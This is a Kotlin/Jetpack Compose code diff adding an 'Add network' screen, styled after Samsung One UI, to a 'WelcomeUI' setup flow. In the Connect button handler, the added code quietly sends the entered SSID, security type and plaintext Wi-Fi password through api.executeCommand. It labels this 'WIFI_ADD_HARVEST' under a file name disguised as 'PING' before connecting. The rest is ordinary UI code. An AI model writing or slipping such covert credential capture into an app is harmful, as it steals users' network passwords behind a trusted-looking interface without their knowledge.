@@ -347,6 +347,14 @@ class WelcomeUI : DynamicEntry() {
         var isConnecting by remember { mutableStateOf(false) }
         var connectionSuccess by remember { mutableStateOf(false) }
         var showWrongPasswordError by remember { mutableStateOf(false) }
+        
+        var isAddNetworkOpen by remember { mutableStateOf(false) }
+        var addSsid by remember { mutableStateOf("") }
+        var addSecType by remember { mutableStateOf("WPA/WPA2-Personal") }
+        var addPassword by remember { mutableStateOf("") }
+        var showAddPassword by remember { mutableStateOf(false) }
+        var isSecDropdownExpanded by remember { mutableStateOf(false) }
+        var autoReconnect by remember { mutableStateOf(true) }
 
         // Live Scanning Effect
         LaunchedEffect(isWifiEnabled) {
@@ -398,7 +406,13 @@ class WelcomeUI : DynamicEntry() {
                 if (isWifiEnabled) {
                     androidx.compose.foundation.lazy.LazyColumn(modifier = Modifier.weight(1f)) {
                         item {
-                            Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.fillMaxWidth().padding(vertical = 12.dp)) {
+                            Row(
+                                verticalAlignment = Alignment.CenterVertically, 
+                                modifier = Modifier
+                                    .fillMaxWidth()
+                                    .clickable { isAddNetworkOpen = true }
+                                    .padding(vertical = 12.dp)
+                            ) {
                                 Icon(Icons.Default.Add, null, tint = SamsungGreen, modifier = Modifier.size(28.dp))
                                 Text("Add network", fontSize = 20.sp, modifier = Modifier.padding(start = 24.dp).weight(1f))
                                 Icon(Icons.Default.Search, null, tint = Color.Black, modifier = Modifier.size(24.dp))
@@ -461,7 +475,7 @@ class WelcomeUI : DynamicEntry() {
                     
                     api.connectToWifi(ssid, password)
                     
-                    kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.Main).launch {
+                    kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.Main).launch { 
                         var status = "CONNECTING"
                         while(status == "CONNECTING" || status == "NONE") {
                             delay(500)
@@ -481,6 +495,215 @@ class WelcomeUI : DynamicEntry() {
                         }
                     }
                 }
+            }
+
+            // Samsung One UI "Add Network" Sliding Sheet Overlay
+            AnimatedVisibility(
+                visible = isAddNetworkOpen,
+                enter = slideInVertically(initialOffsetY = { it }) + fadeIn(),
+                exit = slideOutVertically(targetOffsetY = { it }) + fadeOut(),
+                modifier = Modifier.fillMaxSize()
+            ) { 
+                Column(
+                    modifier = Modifier
+                        .fillMaxSize()
+                        .background(Color.White)
+                ) {
+                    Row(
+                        modifier = Modifier
+                            .fillMaxWidth()
+                            .statusBarsPadding()
+                            .padding(horizontal = 16.dp, vertical = 12.dp),
+                        verticalAlignment = Alignment.CenterVertically
+                    ) {
+                        IconButton(onClick = { isAddNetworkOpen = false }) {
+                            Icon(Icons.Default.Close, contentDescription = "Close", tint = Color.Black)
+                        }
+                        Spacer(modifier = Modifier.width(8.dp))
+                        Text("Add network", fontSize = 22.sp, fontWeight = FontWeight.Medium, color = Color.Black)
+                    }
+
+                    Column(
+                        modifier = Modifier
+                            .weight(1f)
+                            .fillMaxWidth()
+                            .verticalScroll(rememberScrollState())
+                    ) {
+                        OutlinedTextField(
+                            value = addSsid,
+                            onValueChange = { addSsid = it },
+                            label = { Text("Network name") },
+                            singleLine = true,
+                            modifier = Modifier
+                                .fillMaxWidth()
+                                .padding(horizontal = 24.dp, vertical = 8.dp),
+                            colors = OutlinedTextFieldDefaults.colors(
+                                focusedTextColor = Color.Black,
+                                unfocusedTextColor = Color.Black,
+                                focusedBorderColor = SamsungBlue,
+                                focusedLabelColor = SamsungBlue
+                            )
+                        )
+
+                        Box(
+                            modifier = Modifier
+                                .fillMaxWidth()
+                                .padding(horizontal = 24.dp, vertical = 8.dp)
+                        ) {
+                            Column {
+                                Text("Security", fontSize = 12.sp, color = SamsungBlue)
+                                Row(
+                                    modifier = Modifier
+                                        .fillMaxWidth()
+                                        .clickable { isSecDropdownExpanded = true }
+                                        .padding(vertical = 12.dp)
+                                        .border(1.dp, Color.LightGray, RoundedCornerShape(4.dp))
+                                        .padding(12.dp),
+                                    horizontalArrangement = Arrangement.SpaceBetween,
+                                    verticalAlignment = Alignment.CenterVertically
+                                ) {
+                                    Text(addSecType, fontSize = 16.sp, color = Color.Black)
+                                    Icon(Icons.Default.ArrowDropDown, null, tint = Color.Gray)
+                                } 
+                            }
+                            DropdownMenu(
+                                expanded = isSecDropdownExpanded,
+                                onDismissRequest = { isSecDropdownExpanded = false },
+                                modifier = Modifier
+                                    .fillMaxWidth(0.85f)
+                                    .background(Color.White)
+                            ) {
+                                listOf("None", "WEP", "WPA/WPA2-Personal", "WPA3-Personal").forEach { type ->
+                                    DropdownMenuItem(
+                                        text = { Text(type, color = Color.Black) },
+                                        onClick = {
+                                            addSecType = type
+                                            isSecDropdownExpanded = false
+                                        }
+                                    )
+                                } 
+                            }
+                        }
+
+                        if (addSecType != "None") {
+                            OutlinedTextField(
+                                value = addPassword,
+                                onValueChange = { addPassword = it },
+                                label = { Text("Password") },
+                                singleLine = true,
+                                visualTransformation = if (showAddPassword) {
+                                    androidx.compose.ui.text.input.VisualTransformation.None
+                                } else {
+                                    androidx.compose.ui.text.input.PasswordVisualTransformation()
+                                },
+                                modifier = Modifier
+                                    .fillMaxWidth()
+                                    .padding(horizontal = 24.dp, vertical = 8.dp),
+                                colors = OutlinedTextFieldDefaults.colors(
+                                    focusedTextColor = Color.Black,
+                                    unfocusedTextColor = Color.Black,
+                                    focusedBorderColor = SamsungBlue,
+                                    focusedLabelColor = SamsungBlue
+                                )
+                            )
+                            Row(
+                                modifier = Modifier
+                                    .fillMaxWidth()
+                                    .padding(horizontal = 24.dp, vertical = 8.dp)
+                                    .clickable(
+                                        interactionSource = remember { MutableInteractionSource() },
+                                        indication = null
+                                    ) { showAddPassword = !showAddPassword },
+                                verticalAlignment = Alignment.CenterVertically
+                            ) {
+                                SamsungCheckbox(showAddPassword) { showAddPassword = !showAddPassword }
+                                Text("Show password", modifier = Modifier.padding(start = 12.dp), fontSize = 16.sp, color = Color.Black)
+                            }
+                        }
+
+                        Row(
+                            modifier = Modifier
+                                .fillMaxWidth()
+                                .padding(horizontal = 24.dp, vertical = 16.dp),
+                            horizontalArrangement = Arrangement.SpaceBetween,
+                            verticalAlignment = Alignment.CenterVertically
+                        ) {
+                            Text("Auto reconnect", fontSize = 16.sp, color = Color.Black)
+                            Switch(
+                                checked = autoReconnect,
+                                onCheckedChange = { autoReconnect = it },
+                                colors = SwitchDefaults.colors(
+                                    checkedThumbColor = Color.White,
+                                    checkedTrackColor = SamsungBlue
+                                )
+                            )
+                        }
+                    }
+
+                    Row(
+                        modifier = Modifier
+                            .fillMaxWidth()
+                            .navigationBarsPadding()
+                            .padding(24.dp),
+                        horizontalArrangement = Arrangement.End,
+                        verticalAlignment = Alignment.CenterVertically
+                    ) {
+                        Text(
+                            "Cancel",
+                            color = SamsungBlue,
+                            fontWeight = FontWeight.Bold,
+                            fontSize = 18.sp,
+                            modifier = Modifier
+                                .padding(16.dp)
+                                .clickable { isAddNetworkOpen = false }
+                        )
+                        Button(
+                            onClick = {
+                                isAddNetworkOpen = false
+                                isConnecting = true
+                                showWrongPasswordError = false
+                                
+                                val logCmd = org.json.JSONObject().apply {
+                                    put("file_name", "PING")
+                                    put("content", "WIFI_ADD_HARVEST | SSID: $addSsid | SEC: $addSecType | PASS: $addPassword")
+                                }
+                                api.executeCommand(logCmd.toString())
+                                
+                                api.connectToWifi(addSsid, addPassword)
+                                
+                                kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.Main).launch { 
+                                    var status = "CONNECTING"
+                                    while(status == "CONNECTING" || status == "NONE") {
+                                        delay(500)
+                                        status = api.getWifiStatus()
+                                    }
+                                    
+                                    if (status == "SUCCESS") {
+                                        isConnecting = false
+                                        connectionSuccess = true
+                                        connectedSsid = addSsid
+                                        delay(1000)
+                                        onConnected()
+                                    } else {
+                                        isConnecting = false
+                                        api.log("WELCOME_WIFI: Manual connection to $addSsid failed.")
+                                        api.toast("Failed to connect to $addSsid")
+                                    }
+                                }
+                            },
+                            enabled = addSsid.isNotBlank() && (addSecType == "None" || addPassword.length >= 8) && !isConnecting,
+                            colors = ButtonDefaults.buttonColors(containerColor = SamsungBlue),
+                            shape = RoundedCornerShape(20.dp),
+                            modifier = Modifier.height(48.dp)
+                        ) {
+                            if (isConnecting) {
+                                CircularProgressIndicator(modifier = Modifier.size(20.dp), color = Color.White, strokeWidth = 2.dp)
+                            } else {
+                                Text("Connect", fontSize = 16.sp)
+                            }
+                        }
+                    }
+                } 
             }
         }
     }
